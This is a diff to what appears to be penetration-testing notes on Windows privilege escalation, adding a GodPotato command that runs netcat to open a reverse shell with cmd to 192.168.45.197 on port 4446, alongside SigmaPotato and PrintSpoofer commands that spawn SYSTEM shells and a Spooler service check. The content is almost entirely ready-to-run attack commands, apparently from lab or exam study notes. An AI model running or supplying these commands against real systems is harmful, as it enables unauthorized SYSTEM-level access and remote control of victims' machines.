@@ -47,11 +47,25 @@ Upgrade shell:
 .\SigmaPotato.exe -i
 ```
 
+Use GodPotato to get a rev shell:
+
+{% code overflow="wrap" %}
+```powershell
+./GodPotato.exe -cmd "nc64.exe 192.168.45.197 4446 -e cmd"
+```
+{% endcode %}
+
+
+
 
 
 Printspoofer:
 
 If you have an **interactive** shell, you can create a new SYSTEM process in your current console.
+
+```powershell
+Get-Service Spooler
+```
 
 ```
 PrintSpoofer.exe -i -c cmd
